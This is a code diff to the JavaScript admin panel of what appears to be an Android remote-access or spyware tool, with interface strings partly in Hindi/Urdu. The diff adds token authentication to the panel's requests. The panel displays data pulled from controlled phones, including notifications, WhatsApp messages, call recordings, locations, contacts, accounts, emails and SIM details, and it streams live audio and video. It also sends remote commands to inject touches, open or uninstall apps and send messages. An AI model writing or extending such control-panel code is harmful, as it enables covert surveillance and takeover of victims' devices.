@@ -4,6 +4,23 @@ let allData = {};
 let socket;
 let autoRefreshTimer = null;
 
+// ============ AUTH HELPER ============
+function authHeaders() {
+  return {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + (localStorage.getItem('csk4_token') || '')
+  };
+}
+
+function handle401(res) {
+  if (res.status === 401) {
+    localStorage.removeItem('csk4_token');
+    location.reload();
+    return true;
+  }
+  return false;
+}
+
 // ============ LOGIN ============
 function login() {
   const username = document.getElementById('username').value;
@@ -36,6 +53,7 @@ function showDashboard() {
   loadData();
   autoRefreshTimer = setInterval(loadData, 30000);
 
+  if (socket) socket.disconnect();
   socket = io();
   socket.emit('register-admin');
   [
@@ -51,9 +69,13 @@ function loadData() {
   const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
   const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';
 
-  fetch(SERVER_URL + '/api/admin/data')
-    .then(r => r.json())
+  fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
+    .then(r => {
+      if (handle401(r)) return;
+      return r.json();
+    })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       renderTab(currentTab);
@@ -68,9 +90,10 @@ function loadData() {
 }
 
 function refreshStatsOnly() {
-  fetch(SERVER_URL + '/api/admin/data')
-    .then(r => r.json())
+  fetch(SERVER_URL + '/api/admin/data', { headers: authHeaders() })
+    .then(r => { if (handle401(r)) return; return r.json(); })
     .then(data => {
+      if (!data) return;
       allData = data;
       renderStats(data.stats || {});
       if (['notifications','whatsapp','activities','siminfo','accounts','emails'].includes(currentTab)) {
@@ -115,10 +138,8 @@ function renderTab(tab) {
     videos: renderVideos, screenshots: renderScreenshots, audio: renderAudio,
     files: renderFiles, apps: renderApps, bluetooth: renderBluetooth,
     activities: renderActivities, send: renderSend, info: renderInfo,
-    commands: renderCommands,
-    siminfo: renderSimInfo,
-    accounts: renderAccounts,
-    emails: renderEmails
+    commands: renderCommands, siminfo: renderSimInfo,
+    accounts: renderAccounts, emails: renderEmails
   };
   el.innerHTML = (r[tab] || (() => '<div class="loading">Soon</div>'))();
 }
@@ -258,7 +279,7 @@ function renderLive() {
         <button onclick="stopLiveStream()" style="background:#374151">⏹️ Stop</button>
       </div>
       <div class="live-video-wrap">
-        <video id="liveVideo" autoplay playsinline controls muted></video>
+        <video id="liveVideo" autoplay playsinline controls></video>
         <div id="liveStatus" class="live-status">Not streaming</div>
       </div>
       <audio id="liveAudio" autoplay controls style="width:100%;margin-top:12px"></audio>
@@ -378,7 +399,7 @@ function renderCallRecordings() {
 }
 
 function renderLocations() {
-  const list = (allData.locations || []).slice().reverse().slice(0, 200);
+  const list = (allData.locations || []).slice(0, 200);
   if (!list.length) return '<div class="loading">Koi location nahi</div>';
   return list.map(l => `
     <div class="item-card">
@@ -410,11 +431,10 @@ function renderContacts() {
   `).join('');
 }
 
-// ============ 🆕 SIM INFO ============
 function renderSimInfo() {
   const simData = allData.simInfo || {};
   const deviceIds = Object.keys(simData);
-  if (!deviceIds.length) return '<div class="loading">SIM info command bhejein</div>';
+  if (!deviceIds.length) return '<div class="loading">Pehle "Get SIM Info" command bhejein</div>';
   let html = '';
   deviceIds.forEach(deviceId => {
     const data = simData[deviceId];
@@ -437,11 +457,10 @@ function renderSimInfo() {
   return html;
 }
 
-// ============ 🆕 ACCOUNTS ============
 function renderAccounts() {
   const accData = allData.accounts || {};
   const deviceIds = Object.keys(accData);
-  if (!deviceIds.length) return '<div class="loading">Accounts command bhejein</div>';
+  if (!deviceIds.length) return '<div class="loading">Pehle "Get Accounts" command bhejein</div>';
   let html = '';
   deviceIds.forEach(deviceId => {
     const data = accData[deviceId];
@@ -468,11 +487,10 @@ function renderAccounts() {
   return html;
 }
 
-// ============ 🆕 EMAILS ============
 function renderEmails() {
   const emailData = allData.emails || {};
   const deviceIds = Object.keys(emailData);
-  if (!deviceIds.length) return '<div class="loading">Email command bhejein</div>';
+  if (!deviceIds.length) return '<div class="loading">Pehle "Get Emails" command bhejein</div>';
   let html = '';
   deviceIds.forEach(deviceId => {
     const data = emailData[deviceId];
@@ -575,7 +593,7 @@ function renderBluetooth() {
 }
 
 function renderActivities() {
-  const list = (allData.activities || []).slice().reverse().slice(0, 300);
+  const list = (allData.activities || []).slice(0, 300);
   if (!list.length) return '<div class="loading">Koi activity nahi</div>';
   return list.map(a => {
     let icon = '📊';
@@ -682,11 +700,12 @@ function sendCommand() {
 
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command, params })
   })
-  .then(r => r.json())
+  .then(r => { if (handle401(r)) return; return r.json(); })
   .then(d => {
+    if (!d) return;
     if (d.success) toast('✅ ' + command + ' bheja');
     else toast('❌ ' + (d.error||'Fail'));
   })
@@ -704,20 +723,20 @@ function sendCustomMessage() {
   let params = { message, title, to, number: to };
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command: type, params })
   })
-  .then(r => r.json())
-  .then(d => { if (d.success) { toast('✅ Bhej diya'); document.getElementById('sendMessage').value = ''; } })
+  .then(r => { if (handle401(r)) return; return r.json(); })
+  .then(d => { if (d && d.success) { toast('✅ Bhej diya'); document.getElementById('sendMessage').value = ''; } })
   .catch(() => toast('❌ Fail'));
 }
 
 function sendTouch(action, x, y) {
-  const deviceId = document.getElementById('screenDevice').value;
+  const deviceId = document.getElementById('screenDevice')?.value;
   if (!deviceId) return alert('Device select karein');
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command: 'touch_' + action, params: { x, y } })
   }).then(() => toast('👆 Touch bheja'));
 }
@@ -727,7 +746,7 @@ function openApp(pkg) {
   if (!deviceId) return alert('Device select karein');
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command: 'open_app', params: { package: pkg } })
   }).then(() => toast('📱 Open: ' + pkg));
 }
@@ -738,20 +757,29 @@ function uninstallApp(pkg) {
   if (!deviceId) return alert('Device select karein');
   fetch(SERVER_URL + '/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command: 'uninstall_app', params: { package: pkg } })
   }).then(() => toast('🗑️ Uninstall: ' + pkg));
 }
 
 function deleteDevice(id) {
   if (!confirm('Remove?')) return;
-  fetch(SERVER_URL + '/api/admin/device/' + id, { method: 'DELETE' }).then(() => loadData());
+  fetch(SERVER_URL + '/api/admin/device/' + id, {
+    method: 'DELETE',
+    headers: authHeaders()
+  }).then(() => loadData());
 }
 
 function clearCommands() {
   const id = document.getElementById('cmdDevice').value;
   if (!id) return alert('Device select karein');
-  fetch(SERVER_URL + '/api/admin/clear-commands/' + id, { method: 'DELETE' }).then(() => loadData());
+  fetch(SERVER_URL + '/api/admin/clear-commands/' + id, {
+    method: 'DELETE',
+    headers: authHeaders()
+  })
+  .then(r => { if (handle401(r)) return; return r.json(); })
+  .then(() => { toast('🗑️ Commands cleared'); loadData(); })
+  .catch(() => toast('❌ Fail'));
 }
 
 function esc(s) {
